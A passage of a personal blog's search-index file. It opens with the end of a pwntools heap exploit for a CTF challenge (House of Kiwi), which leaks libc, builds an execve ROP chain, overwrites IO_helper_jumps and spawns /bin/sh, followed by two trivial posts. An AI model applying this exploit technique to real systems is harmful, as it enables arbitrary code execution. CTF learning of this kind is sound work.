class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><br>ret = libcbase + <span class="hljs-number">0x25679</span><br>pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall = libcbase + <span class="hljs-number">0x2584d</span><br>rop = p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) <br>rop += p64(heap_addr + <span class="hljs-number">0x30</span>) +p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>) +p64(syscall)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, rop)<br>edit(<span class="hljs-number">2</span>, p64(IO_helper_jumps + <span class="hljs-number">0xa0</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, p64(heap_addr -<span class="hljs-number">0x1b0</span>) + p64(ret))<br><span class="hljs-comment">#add(0x80, 9, b&#x27;a&#x27;)</span><br><br>add(<span class="hljs-number">0x28</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>+ <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br>gift()<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p> 参考：<a href="https://www.anquanke.com/post/id/235598">House OF Kiwi - 安全客，安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/11/01/Hello-world/"/>
    <url>/2022/11/01/Hello-world/</url>
    
    <content type="html"><![CDATA[<p>Hello World</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/10/31/2022-10-31/"/>
    <url>/2022/10/31/2022-10-31/</url>
    
    <content type="html"><![CDATA[<h2 id="2022-10-31"><a href="#2022-10-31" class="headerlink" title="2022-10-31"></a>2022-10-31</h2><p><strong>Happy halloween</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
